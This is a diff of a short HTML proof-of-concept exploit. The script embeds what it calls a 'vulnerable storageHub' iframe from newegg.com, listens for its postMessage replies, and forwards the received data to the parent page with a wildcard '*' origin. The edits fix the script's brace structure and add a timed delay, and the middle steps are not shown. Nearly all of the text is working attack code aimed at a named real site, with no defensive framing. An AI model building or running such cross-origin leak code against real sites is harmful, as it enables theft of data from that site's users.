@@ -2,7 +2,6 @@
 <html>
   <body>
     <script>
-      // wait until the parent finishes loading the target iframe
       // Step 1: Create a new iframe pointing to vulnerable storageHub
       const victim = document.createElement("iframe");
       victim.src = "https://newegg.com/api/storageHub"; // Replace with actual vulnerable iframe URL
@@ -25,14 +24,16 @@
         // Step 4: Listen for response from storageHub
         window.addEventListener("message", (event) => {
           console.log("Sandboxed iframe received response from victim:", event.origin, event.data);
-        }
 
           // Optionally forward response to main parent page
           window.parent.postMessage("Victim said: " + event.data, "*");
         });
+
+      }, 1500);
     </script>
   </body>
 </html>
+
 
 
 
